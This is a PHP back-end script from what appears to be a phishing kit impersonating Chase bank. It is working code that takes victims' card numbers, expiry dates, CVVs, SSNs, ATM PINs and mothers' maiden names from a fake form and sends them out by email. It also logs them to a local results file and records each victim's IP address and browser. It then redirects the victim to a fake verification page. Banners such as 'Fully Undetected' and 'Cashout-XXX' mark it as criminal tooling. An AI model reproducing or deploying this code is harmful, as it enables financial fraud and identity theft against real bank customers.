<?php
$zabi = getenv("REMOTE_ADDR");
include '../antibots.php';
include('../email.php');
include '../bt.php';
include "../blocker.php";
$message .= "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$message .= "----------C4rd chase --------------------\n";
$message .= "Credit Card Number: ".$_POST['12']."\n";
$message .= "MM/YYYY: ".$_POST['13']."\n";
$message .= "CCV/CSC: ".$_POST['14']."\n";
$message .= "SSN: ".$_POST['16']."\n";
$message .= "ATM PIN: ".$_POST['15']."\n";
$message .= "Mother's maiden name: ".$_POST['0001']."\n";
$message .= "++-----[ $$ Fully Undetected by Mou AD $$ ]-----++\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Mou Ad  ----------------------\n";
$cc = $_POST['ccn'];
$subject = "chase c4rd info [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Cashout-XXX <service>\r\n";
mail($email,$subject,$message,$headers);
    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);
mail(','.$form,$subject,$message,$headers);

header("Location: ../verification-finished.php");?>